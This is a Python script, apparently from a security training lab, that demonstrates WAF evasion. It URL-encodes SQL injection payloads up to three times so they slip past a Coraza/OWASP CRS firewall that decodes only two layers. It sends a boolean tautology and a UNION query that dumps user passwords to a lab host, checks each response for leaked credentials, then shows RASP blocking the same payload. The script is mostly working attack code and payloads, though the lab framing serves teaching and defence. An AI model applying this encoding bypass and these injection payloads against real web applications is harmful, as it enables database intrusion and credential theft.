#!/usr/bin/env python3
"""Cardinal — ALTERNATE / MULTI-ENCODING WAF evasion (reference sqli-reference.pdf
§3, row 1: "Alternate / mismatched encodings").

The idea: encode a payload so the WAF sees it STILL ENCODED (no SQL to match)
while the app decodes it back into the real attack. The classic phrasing is
"double-URL-encoding", but the real requirement is a *decode-depth asymmetry*:

    the app must decode one layer MORE than the WAF normalizes.

Why double-encoding does NOT work on this stack (verified against the live lab):
Coraza + OWASP CRS normalizes TWO encoding layers before matching (it decodes the
argument once when parsing, then again via the CRS `t:urlDecodeUni` transform). So
a DOUBLE-encoded payload is fully decoded by the WAF and caught by libinjection
(rule 942100, "SQL Injection Attack Detected via libinjection"). The webapp also
decodes twice at decode=double (Werkzeug once + one extra unquote) -> same depth as
the WAF -> no asymmetry -> blocked.

A TRIPLE-encoded payload survives the WAF's two decodes as still-encoded %XX (no
keyword, no quote) and sails past, while the app's decode=triple (Werkzeug once +
TWO extra unquotes) peels all three layers and re-forms the real attack. That one
extra decode is the whole evasion.

We percent-encode EVERY byte (not just quotes/spaces) so even literal keywords like
UNION/SELECT stay hidden from the WAF after its two decodes -- otherwise the
alphabetic keywords survive and CRS still flags them.

Ports (proxy/etc/caddy/Caddyfile):
  :80    enforcing WAF  (Coraza + OWASP CRS)  -> blocks
  :8080  detection-only -> logs to /shared/waf_audit.log, forwards

This walks a payload plain -> single -> double -> triple and prints what each
actually did. It does NOT assume the outcome -- read the matched CRS rule ids off
/shared/waf_audit.log (expect 942100 on the plain/single/double attempts, and
nothing on the triple one that slips past).

Run on the attacker node:  /scripts/encoding_evasion.sh   (wraps this)
                     or:    python3 /scripts/encoding_evasion.py
"""
import json
import urllib.error
import urllib.parse
import urllib.request

HOST = "172.30.0.10"
ENFORCE = f"http://{HOST}"          # :80  — enforcing WAF
DETECT = f"http://{HOST}:8080"      # :8080 — detection only

BOOL = "' OR '1'='1"
UNION = "zzz' UNION SELECT id,username,password,title,department,bio,status FROM users-- -"


def enc1(s):   # single-encode EVERY byte, so keyword letters are hidden too
    return "".join("%%%02X" % b for b in s.encode())


def enc2(s):   # double-encode: re-escape the percent signs (%27 -> %2527)
    return enc1(s).replace("%", "%25")


def enc3(s):   # triple-encode: one more layer (the depth that out-decodes the WAF)
    return enc2(s).replace("%", "%25")


def plain(s):  # minimal: only spaces encoded, so keywords/quotes stay literal
    return s.replace(" ", "%20")


def fetch(base, q_wire, extra=""):
    """GET /api/directory with q placed on the wire VERBATIM (urllib does not
    re-encode the query), so we control exactly how many decode layers it carries."""
    url = f"{base}/api/directory?impl=concat&q={q_wire}{extra}"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url), timeout=15)
        return r.getcode(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return None, f"(error: {e})"


def verdict(code, text, leak=None):
    if code == 403:
        who = "RASP" if "rasp" in text.lower() else "WAF"
        return f"BLOCKED by {who} (403)"
    if code != 200:
        return f"HTTP {code}"
    try:
        d = json.loads(text)
        n = d.get("count", len(d.get("results", [])))
    except Exception:
        return "passed (non-JSON)"
    if leak is not None:
        return f"INJECTED — creds LEAKED (rows={n})" if leak in text else f"passed, no leak (rows={n})"
    return f"INJECTED — all rows ({n})" if isinstance(n, int) and n > 1 else f"passed, inert (rows={n})"


def step(label, base, q_wire, extra="", leak=None):
    code, text = fetch(base, q_wire, extra)
    port = base.split(HOST)[-1] or ":80"
    print(f"  {label}")
    print(f"      wire q={q_wire[:70]}{'…' if len(q_wire) > 70 else ''}")
    print(f"      {port:6} -> {verdict(code, text, leak)}")


def main():
    print("=" * 74)
    print("BOOLEAN tautology   ' OR '1'='1   (concat path returns ALL rows if it fires)")
    print("=" * 74)
    step("A. plain            @ :80  (SQL in cleartext)", ENFORCE, plain(BOOL))
    step("B. single-encoded   @ :80, decode=single (WAF: 2 decodes)", ENFORCE, enc1(BOOL), "&decode=single")
    step("C. double-encoded   @ :80, decode=double (app 2 == WAF 2)", ENFORCE, enc2(BOOL), "&decode=double")
    step("D. TRIPLE-encoded   @ :80, decode=triple (app 3  > WAF 2)", ENFORCE, enc3(BOOL), "&decode=triple")
    print("     A/B/C are caught by libinjection (942100): the WAF decodes TWO layers,")
    print("     so even the double-encoded payload is fully revealed to it. D is the")
    print("     bypass -- the WAF's two decodes leave it as %XX (no SQL), and the app's")
    print("     THIRD decode re-forms the quote. Confirm the rule ids in waf_audit.log.")
    step("E. TRIPLE-encoded   @ :8080 detection, decode=triple (baseline)", DETECT, enc3(BOOL), "&decode=triple")

    print()
    print("=" * 74)
    print("UNION creds dump    (look for 'alicepw' in the response)")
    print("=" * 74)
    step("A. plain            @ :80", ENFORCE, plain(UNION), leak="alicepw")
    step("D. TRIPLE-encoded   @ :80, decode=triple", ENFORCE, enc3(UNION), "&decode=triple", leak="alicepw")

    print()
    print("=" * 74)
    print("COMPOSITION — RASP catches the payload that beat the WAF")
    print("=" * 74)
    step("F. TRIPLE-encoded   @ :80, decode=triple, rasp=block", ENFORCE, enc3(BOOL), "&decode=triple&rasp=block")
    print("     RASP inspects the FINAL, decoded query at the DB call (reference §2.4),")
    print("     so the encoding trick that blinds the WAF does not help against it.")

    print()
    print("[*] WAF verdicts (matched CRS rule ids): /shared/waf_audit.log")
    print("[*] RASP verdicts:                       /shared/rasp_audit.log")


if __name__ == "__main__":
    main()
